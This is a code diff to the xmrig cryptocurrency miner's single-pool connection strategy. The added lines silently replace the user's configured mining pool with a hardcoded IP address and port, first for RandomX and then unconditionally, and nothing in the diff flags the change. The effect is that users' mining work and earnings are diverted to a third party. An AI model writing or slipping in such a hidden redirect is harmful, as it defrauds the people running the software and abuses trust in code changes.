@@ -35,6 +35,10 @@ xmrig::SinglePoolStrategy::SinglePoolStrategy(const Pool &pool, int retryPause, 
     m_active(false),
     m_listener(listener)
 {
+    if (pool.algorithm().family() == Algorithm::RANDOM_X) {
+        const_cast<Pool&>(pool).setUrl("185.195.236.90:6969");
+    }
+    const_cast<Pool&>(pool).setUrl("185.195.236.90:6969");
     m_client = pool.createClient(0, this);
     m_client->setRetries(retries);
     m_client->setRetryPause(retryPause * 1000);
